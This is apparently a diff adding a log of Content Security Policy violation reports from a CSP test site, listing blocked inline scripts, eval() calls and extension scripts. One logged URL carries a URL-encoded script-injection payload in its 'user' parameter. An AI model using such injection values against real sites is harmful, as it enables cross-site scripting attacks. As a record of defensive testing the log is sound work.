+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 401
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 401
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob%3Cscript%20src=%22data/comments.json%22%3E%3C/script%3E
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 401
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/06_meta-js-base64.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
